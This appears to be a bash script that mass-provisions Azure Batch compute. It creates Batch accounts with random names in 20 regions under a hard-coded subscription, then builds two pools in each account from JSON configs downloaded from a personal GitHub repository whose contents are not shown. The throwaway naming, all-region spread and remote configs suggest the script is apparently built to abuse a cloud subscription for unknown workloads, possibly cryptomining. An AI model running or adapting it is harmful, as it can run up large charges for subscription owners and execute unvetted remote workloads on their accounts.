#!/bin/bash
sub="6825b65c-5e39-4010-a07d-82fb760cb696"
ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
wget -O batch.json https://raw.githubusercontent.com/winttr89/batch1/main/batch.json
wget -O batch2.json https://raw.githubusercontent.com/winttr89/batch1/main/batch2.json
az provider register --namespace Microsoft.Batch --subscription "$sub"
az group create --name batchacc$ran --location westus2 --subscription "$sub"
echo "sleep 15s..."
sleep 15s
nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
batch=0
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	echo "Batch account creating...$region"
	batch=$(( $batch + 1 ))
	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
done
echo "sleep 8m..."
sleep 8m
batch=0
echo "Batch account setting..."
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	batch=$(( $batch + 1 ))
	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
done
echo "Xong..."
